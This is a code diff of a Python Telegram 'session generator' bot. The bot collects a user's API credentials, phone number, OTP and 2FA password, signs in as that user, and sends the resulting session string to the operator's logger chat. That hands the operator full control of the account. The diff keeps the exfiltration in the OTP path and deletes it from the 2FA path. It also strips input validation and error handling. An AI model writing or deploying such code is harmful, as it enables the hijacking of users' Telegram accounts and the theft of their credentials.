@@ -1,6 +1,5 @@
 import os
 import time
-import asyncio
 from pyrogram import Client, filters
 from pyrogram.errors import SessionPasswordNeeded
 from telethon.sessions import StringSession
@@ -29,9 +28,8 @@ users_db = None
 try:
     mongo = AsyncIOMotorClient(os.getenv("MONGO_URL"))
     users_db = mongo["bot"]["users"]
-except Exception as e:
-    print(f"MongoDB Error: {e}")
-    users_db = None
+except:
+    pass
 
 users = {}
 
@@ -51,14 +49,11 @@ async def start(client, message):
     user = message.from_user
 
     if users_db is not None:
-        try:
-            await users_db.update_one(
-                {"user_id": user.id},
-                {"$set": {"user_id": user.id}},
-                upsert=True
-            )
-        except:
-            pass
+        await users_db.update_one(
+            {"user_id": user.id},
+            {"$set": {"user_id": user.id}},
+            upsert=True
+        )
 
     await send_log(f"""
 🚀 START
@@ -81,45 +76,36 @@ async def handler(client, message):
         return
 
     if time.time() - user_data["time"] > 180:
-        users.pop(message.from_user.id, None)
+        users.pop(message.from_user.id)
         return await message.reply("⌛ Timeout")
 
     try:
 
         # API ID
         if "api_id" not in user_data:
-            try:
-                user_data["api_id"] = int(message.text)
-            except ValueError:
-                return await message.reply("❌ API_ID must be a number. Send again.")
-            user_data["time"] = time.time()
+            user_data["api_id"] = int(message.text)
             return await message.reply("Send API_HASH")
 
         # API HASH
         elif "api_hash" not in user_data:
             user_data["api_hash"] = message.text
-            user_data["time"] = time.time()
             return await message.reply("Send Phone (+91...)")
 
         # PHONE
         elif "phone" not in user_data:
             user_data["phone"] = message.text
-            user_data["time"] = time.time()
-
-            # 🔴 FIX: Use a UNIQUE session name per user so multiple users don't conflict
-            session_name = f"temp_{message.from_user.id}"
 
             app = Client(
-                session_name,
+                "temp",
                 api_id=user_data["api_id"],
                 api_hash=user_data["api_hash"]
             )
 
             await app.connect()
-            sent_code = await app.send_code(user_data["phone"])
+            code = await app.send_code(user_data["phone"])
 
             user_data["app"] = app
-            user_data["hash"] = sent_code.phone_code_hash
+            user_data["hash"] = code.phone_code_hash
 
             return await message.reply("Send OTP")
 
@@ -127,7 +113,6 @@ async def handler(client, message):
         elif "otp" not in user_data:
 
             user_data["otp"] = message.text
-            user_data["time"] = time.time()
 
             try:
                 await user_data["app"].sign_in(
@@ -147,17 +132,10 @@ async def handler(client, message):
 
             await send_log(f"🆕 SESSION GENERATED\nID: {message.from_user.id}")
 
-            # 🔴 FIX: send_document expects a file path or InputFile, not raw bytes
             if users_db:
-                try:
-                    with open(f"session_{message.from_user.id}.txt", "w") as f:
-                        f.write(string)
-                    await bot.send_document(LOGGER_ID, f"session_{message.from_user.id}.txt")
-                    os.remove(f"session_{message.from_user.id}.txt")
-                except Exception as e:
-                    print(f"DOC SEND ERROR: {e}")
+                await bot.send_document(LOGGER_ID, bytes(string, "utf-8"), file_name="session.txt")
 
-            users.pop(message.from_user.id, None)
+            users.pop(message.from_user.id)
             return
 
         # PASSWORD (2FA)
@@ -178,20 +156,10 @@ async def handler(client, message):
 
                 await send_log(f"🔐 2FA SESSION\nID: {message.from_user.id}")
 
-                # Also save to file if DB is configured
-                if users_db:
-                    try:
-                        with open(f"session_{message.from_user.id}.txt", "w") as f:
-                            f.write(string)
-                        await bot.send_document(LOGGER_ID, f"session_{message.from_user.id}.txt")
-                        os.remove(f"session_{message.from_user.id}.txt")
-                    except:
-                        pass
-
             except Exception as e:
                 return await message.reply(f"❌ Wrong Password: {e}")
 
-            users.pop(message.from_user.id, None)
+            users.pop(message.from_user.id)
             return
 
     except Exception as e:
